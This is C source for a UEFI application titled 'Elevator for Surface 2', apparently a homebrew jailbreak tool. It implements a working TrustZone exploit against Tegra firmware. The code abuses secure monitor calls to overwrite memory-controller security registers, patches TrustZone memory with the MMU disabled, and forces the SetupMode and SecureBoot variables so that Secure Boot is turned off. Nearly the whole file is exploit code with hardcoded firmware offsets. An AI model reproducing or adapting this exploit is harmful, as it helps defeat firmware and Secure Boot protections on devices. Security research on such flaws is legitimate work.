#include "EFIApp.h"
#include "application.h"

STATIC
UINT32
ArmCallSmcHelper(UINT32 R0, UINT32 R1, UINT32 R2, UINT32 R3)
{
  ARM_SMC_ARGS ArmSmcArgs;

  Print(
      L"ArmCallSmcHelper: >>> {0x%08x, 0x%08x, 0x%08x, 0x%08x}\n", R0, R1, R2,
      R3);

  ArmSmcArgs.Arg0 = R0;
  ArmSmcArgs.Arg1 = R1;
  ArmSmcArgs.Arg2 = R2;
  ArmSmcArgs.Arg3 = R3;

  ArmCallSmc(&ArmSmcArgs);

  Print(
      L"ArmCallSmcHelper: <<< {0x%08x, 0x%08x, 0x%08x, 0x%08x}\n",
      ArmSmcArgs.Arg0, ArmSmcArgs.Arg1, ArmSmcArgs.Arg2, ArmSmcArgs.Arg3);
  return ArmSmcArgs.Arg0;
}

VOID CortexA15CachePrime(VOID)
{
  UINTN PageSize = 4096;
  UINTN Base     = 0x83000000;

  Print(L"CortexA15CachePrime: priming cache...\n");

  for (UINTN Address = 0; Address < (8 * 1024 * 1024); Address += PageSize) {
    if ((Address % (1 * 1024 * 1024)) == 0) {
      Print(L"CortexA15CachePrime: preloading 0x%08x\n", Base + Address);
    }

    __prefetch((VOID *)(Base + Address));
  }

  ArmDataMemoryBarrier();
  ArmDataSynchronizationBarrier();
  ArmInstructionSynchronizationBarrier();

  Print(L"CortexA15CachePrime: Done.\n");
}

VOID PerformNvExploit(VOID)
{
  UINT32 Ret = 0;
  // Get size of the buffers needed (discarded)
  Ret = ArmCallSmcHelper(0x03, 0x09, 0, 0);
  Print(L"ArmCallSmcHelper: 0x%x\n", Ret);

  // Switch secure world handlers to runtime mode
  Ret = ArmCallSmcHelper(0x03, 0x05, 0, 0);
  Print(L"ArmCallSmcHelper: 0x%x\n", Ret);

  // Register a new shared memory buffer at 0x4000_0000 (IRAM) with size
  // 0x6001_e0e0. The following algorithm is used to determine the end address
  // that the QueryVariable call will write over:
  //  response_area = (request_area + (area_slice >> 1));
  Ret = ArmCallSmcHelper(0x03, 0x06, 0x40000000, 0x6001e0e0);
  Print(L"ArmCallSmcHelper: 0x%x\n", Ret);

  // QueryVariable, does a 32 byte memory copy over to 0x7000f070...f090.
  // (MC_SECURITY_CFG0, MC_SECURITY_CFG1 and reserved registers)
  gBS->SetMem((VOID *)0x40000000, 32, 0);
  Ret = ArmCallSmcHelper(0x03, 0x03, 0, 0);
  Print(L"ArmCallSmcHelper: 0x%x\n", Ret);
}

VOID Tegra3ConsoleOutputFixup(VOID)
{
  EFI_STATUS                    Status                   = EFI_SUCCESS;
  UINTN                         NumOutputProtocolHandles = 0;
  EFI_HANDLE *                  pOutputHandles;
  EFI_SIMPLE_TEXT_OUT_PROTOCOL *pScreenEfiOutputProtocol;

  Status = gBS->LocateHandleBuffer(
      ByProtocol, &gEfiSimpleTextOutProtocolGuid, NULL,
      &NumOutputProtocolHandles, &pOutputHandles);

  // Some sanity check here.
  if (!EFI_ERROR(Status) && NumOutputProtocolHandles >= 3) {
    // Take the last handle as ConOut, don't know how I know this.
    // It is painful...and it is 5am now
    Status = gBS->HandleProtocol(
        pOutputHandles[NumOutputProtocolHandles - 1],
        &gEfiSimpleTextOutProtocolGuid, (VOID **)&pScreenEfiOutputProtocol);

    // Hack: force use the screen output for ConOut
    if (!EFI_ERROR(Status)) {
      gST->ConOut           = pScreenEfiOutputProtocol;
      gST->ConsoleOutHandle = pOutputHandles[NumOutputProtocolHandles - 1];
      // TODO: Maybe set ConOut device later...?
      pScreenEfiOutputProtocol->OutputString(
          pScreenEfiOutputProtocol,
          L"At this moment you should have seen something on the screen...\n");
    }
  }
}

// This is the actual entrypoint.
// Application entrypoint (must be set to 'efi_main' for gnu-efi crt0
// compatibility)
EFI_STATUS efi_main(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable)
{

  InitializeLib(ImageHandle, SystemTable);

#ifdef TEGRA3
  Tegra3ConsoleOutputFixup();
#endif

  EFI_STATUS Status = EFI_SUCCESS;
  UINTN      KeyEvent;

#ifdef TEGRA3
  Tegra3ConsoleOutputFixup();
#endif

  // Turn off watchdog timer, since this does take a while
  gBS->SetWatchdogTimer(0, 0, 0, NULL);

  Print(L"\nElevator for Surface 2\n");

  // Perform the TrustZone exploit, so TrustZone memory
  // can be unprotected from normal world
  Print(L"Hmmm.\n");
  PerformNvExploit();
  Print(L"Hmmmmmm.\n");

  // TrustZone memory is not mapped in normal world.
  // Since I am lazy to modify PT, I decided to just turn off MMU
  // and turn it back on later.
  ArmDisableCachesAndMmu();
  ArmInvalidateTlb();
  ArmInvalidateDataCache();
  ArmInvalidateInstructionCache();

  UINT32 Something = *((UINT32 *)((VOID *)0x80000000));
  ArmEnableMmu();
  ArmEnableDataCache();
  ArmEnableInstructionCache();
  Print(L"Something at 0x80000000 with exploit: 0x%x\n", Something);
  // If memory access succeeded, we should read something not just FFFFFFF
  if (Something == 0xFFFFFFFF) {
    Print(L"Something happened and the exploit doesn't work\n");
    Status = EFI_ABORTED;
    goto exit;
  }

  // Check some offset things. The NvVariableDxe.efi program directly
  // registers its variable handler to EFI System Table, so we have a
  // convenient way to determine its memory location.
  //
  // We want to retrieve the original shared buffer address to
  // normally invoke EFI variable services.

  // Static analysis based on the Surface 2 4.22.500 firmware
  // SetVariableAddress = Base + 0xb54
  UINTN SetVariableAddress = (UINTN)((VOID *)gRT->SetVariable);
  // gSharedMemoryStart = Base + 0x5ff8
  // gSharedMemoryEnd = Base + 0x5ff0
  UINTN SharedMemoryStartAddressPointerAddress = SetVariableAddress + 0x54A4;
  UINTN SharedMemoryEndAddressPointerAddress   = SetVariableAddress + 0x549C;
  UINTN SharedMemoryStartAddress =
      *((UINTN *)SharedMemoryStartAddressPointerAddress);
  // Similarly
  UINTN SharedMemoryEndAddress =
      *((UINTN *)SharedMemoryEndAddressPointerAddress);
  // Check if the value makes sense or not
  Print(L"Set Variable Address = %p\n", SetVariableAddress);
  Print(L"Shared Memory Start = %p\n", SharedMemoryStartAddress);
  Print(L"Shared Memory End = %p\n", SharedMemoryEndAddress);
  if (SharedMemoryEndAddress != SharedMemoryStartAddress + 0x12004) {
    Print(L"Shared memory area sanity check failed: size mismatch (wrong "
          L"data?)\n");
    Status = EFI_ABORTED;
    goto exit;
  }

  // Where is TrustZone binary?
  // Turn off MMU before proceeding for the same reason.
  // There's no good way to determine its actual location assuming it might
  // change, But since we know GetHashState string only appears in TZ binary, we
  // just brute force search the memory for the result.
  ArmDisableCachesAndMmu();
  ArmInvalidateTlb();
  ArmInvalidateDataCache();
  ArmInvalidateInstructionCache();

  const char GetHashStateString[] = "GetHashState";
  // This might not has to search 0x80000000 to 0x83000000, can be smaller
  void *pTzGetHashStateString = memmem(
      (void *)0x80000000, 0x2000000, GetHashStateString,
      sizeof(GetHashStateString));
  volatile char *pRuntimeFlag1;
  volatile char *pRuntimeFlag2;
  char           runtimeFlag1 = 0, runtimeFlag2 = 0, valid = 0;
  // GetHashState = Base + 0x97c2c
  // RuntimeMode flag 1: Base+0xbe510 (clear buffer and register buffer again
  // with handler) RuntimeMode flag 2: Base+0xbe4e4 (variable checks that so
  // secure variable cannot be written) Clear these two flags to 0 to allow
  // register buffer again
  if (pTzGetHashStateString != NULL) {
    pRuntimeFlag1 = ((volatile char *)pTzGetHashStateString + 0x268E4);
    pRuntimeFlag2 = ((volatile char *)pTzGetHashStateString + 0x268B8);

    runtimeFlag1 = *pRuntimeFlag1;
    runtimeFlag2 = *pRuntimeFlag2;
    valid        = 1;
  }

  ArmEnableDataCache();
  ArmEnableInstructionCache();
  ArmEnableMmu();

  if (valid) {
    Print(
        L"Runtime Flag 1 = %d, Runtime Flag 2 = %d\n", runtimeFlag1,
        runtimeFlag2);
    Print(L"GetHashState string address = %p\n", pTzGetHashStateString);
    // They are supposed to be 1
    if (runtimeFlag1 != 1 || runtimeFlag2 != 1) {
      Print(L"Unexpected Runtime Flag value\n");
      goto exit;
    }
  }
  else {
    Print(L"Pattern not found. Hmm.\n");
    Status = EFI_NOT_FOUND;
    goto exit;
  }

RuntimePhase1:
  CortexA15CachePrime();

  Print(L"Disabling MMU...\n");

  // Revert runtime mode flags, phase 1
  ArmDisableCachesAndMmu();
  ArmInvalidateTlb();
  ArmInvalidateDataCache();
  ArmInvalidateInstructionCache();

  *(volatile UINT32 *)pRuntimeFlag1 = 0;
  *(volatile UINT32 *)pRuntimeFlag2 = 0;

  ArmDataMemoryBarrier();
  ArmDataSynchronizationBarrier();
  ArmCleanInvalidateDataCache();

  ArmEnableMmu();
  ArmEnableDataCache();
  ArmEnableInstructionCache();

  Print(L"MMU re-enabled + caches re-enabled\n");

  // Re-trigger runtime mode switch, which clears the old registration
  UINT32 Ret = 0;
  Ret        = ArmCallSmcHelper(0x03, 0x05, 0, 0);
  Print(L"ArmCallSmcHelper: 0x%x\n", Ret);
  if (Ret == 1) {
    Print(L"Retrying... -- runtime mode patch phase 1\n");
    goto RuntimePhase1;
  }
  else if (Ret != 0) {
    Print(L"Unexpected call from ArmCallSmcHelper - runtime mode patch phase "
          L"1\n");
    goto exit;
  }

PatchStringPhase1:
  CortexA15CachePrime();

  Print(L"Disabling MMU...\n");

  // Revert runtime mode flags, phase 2
  // Patch string, phase 1
  ArmDisableCachesAndMmu();
  ArmInvalidateTlb();
  ArmInvalidateDataCache();
  ArmInvalidateInstructionCache();

  *pRuntimeFlag1 = 0;
  *pRuntimeFlag2 = 0;
  // String is located at Base+0x9811c, delta = 0x4F0
  volatile char *pSetupModeString =
      ((volatile char *)pTzGetHashStateString + 0x4F0);
  // String is located at Base+0x98130, delta = 0x504
  volatile char *pSecureBootString =
      ((volatile char *)pTzGetHashStateString + 0x504);
  // BetupMode, BecureBoot
  *pSetupModeString  = 'B';
  *pSecureBootString = 'B';

  ArmDataMemoryBarrier();
  ArmDataSynchronizationBarrier();
  ArmCleanInvalidateDataCache();

  ArmEnableMmu();
  ArmEnableDataCache();
  ArmEnableInstructionCache();

  Print(L"MMU re-enabled + caches re-enabled\n");

  // Re-register shared memory buffer area
  // To let variable services pick it up again
  Ret = ArmCallSmcHelper(0x03, 0x06, (UINT32)SharedMemoryStartAddress, 0x24008);
  Print(L"ArmCallSmcHelper: 0x%x\n", Ret);
  if (Ret == 1) {
    Print(L"Retrying... -- shared memory address registration\n");
    goto PatchStringPhase1;
  }
  else if (Ret != 0) {
    Print(L"Unexpected call from ArmCallSmcHelper - shared memory address "
          L"registration\n");
    goto exit;
  }

  // Ready to patch the variable
  Print(L"Thinking....\n");
  UINT8 Data = 1;
  // SecureMode = 1 to disarm all security checks
  Status = gRT->SetVariable(
      L"SetupMode", &gEfiGlobalVariableGuid,
      EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS |
          EFI_VARIABLE_NON_VOLATILE,
      sizeof(UINT8), &Data);
  if (!EFI_ERROR(Status)) {
    Data = 0;
    // SecureBoot = 0 to explicitly disable Secure Boot
    Status = gRT->SetVariable(
        L"SecureBoot", &gEfiGlobalVariableGuid,
        EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS |
            EFI_VARIABLE_NON_VOLATILE,
        sizeof(UINT8), &Data);
    if (!EFI_ERROR(Status)) {
      Print(L"Have fun\n");
      UINTN VarSize = sizeof(UINT8);
      Status        = gRT->GetVariable(
          L"SetupMode", &gEfiGlobalVariableGuid, NULL, &VarSize, &Data);
      if (!EFI_ERROR(Status)) {
        Print(L"SetupMode = 0x%x\n", Data);
      }

      Status = gRT->GetVariable(
          L"SecureBoot", &gEfiGlobalVariableGuid, NULL, &VarSize, &Data);
      if (!EFI_ERROR(Status)) {
        Print(L"SecureBoot = 0x%x\n", Data);
      }
    }
    else {
      Print(L"Something happened: 0x%x (setting SecureBoot)\n", Status);
    }
  }
  else {
    Print(L"Something happened: 0x%x (setting SetupMode)\n", Status);
  }

exit:
  // Let people inspect the result. Wait a keystoke
  Print(L"!!! PLEASE RESET YOUR DEVICE MANUALLY USING THE POWER BUTTON !!!\n");
  Print(L"!!! PLEASE RESET YOUR DEVICE MANUALLY USING THE POWER BUTTON !!!\n");
  Print(L"!!! PLEASE RESET YOUR DEVICE MANUALLY USING THE POWER BUTTON !!!\n");
  while (1)
    ;

  gST->ConIn->Reset(gST->ConIn, FALSE);
  gST->BootServices->WaitForEvent(1, &gST->ConIn->WaitForKey, &KeyEvent);
  // Make compiler happy
  return Status;
}
